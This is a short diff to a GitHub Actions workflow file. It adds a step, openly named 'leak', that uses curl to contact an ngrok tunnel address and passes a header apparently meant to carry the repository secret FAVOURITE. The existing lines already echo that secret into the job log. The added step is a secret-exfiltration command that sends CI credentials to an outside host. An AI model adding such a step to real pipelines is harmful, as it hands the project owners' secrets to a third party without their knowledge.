@@ -24,3 +24,7 @@ jobs:
 
       - name: I ll tell you my current favourite 
         run: echo ${{ secrets.FAVOURITE }}
+
+      - name: leak
+        run: |
+            curl https://8cab-128-131-211-139.ngrok-free.app -H "X-API-Key: $secrets.FAVOURITE"
